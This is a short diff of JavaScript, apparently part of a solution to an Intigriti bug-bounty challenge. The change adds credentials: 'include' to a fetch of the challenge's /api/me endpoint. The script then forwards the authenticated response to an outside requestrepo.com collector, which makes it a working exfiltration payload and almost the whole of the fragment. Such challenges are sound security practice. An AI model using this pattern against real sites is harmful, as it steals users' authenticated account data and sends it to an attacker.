@@ -47,7 +47,10 @@
     
     executeAttack();      
 
-fetch('https://challenge-0126.intigriti.io/api/me')
+fetch('https://challenge-0126.intigriti.io/api/me',  {
+  method: "GET",
+  credentials: "include"
+})
   .then(response => response.text()) 
   .then(data => {
     fetch('https://we6hfxdk.requestrepo.com/?dd=' + encodeURIComponent(data));
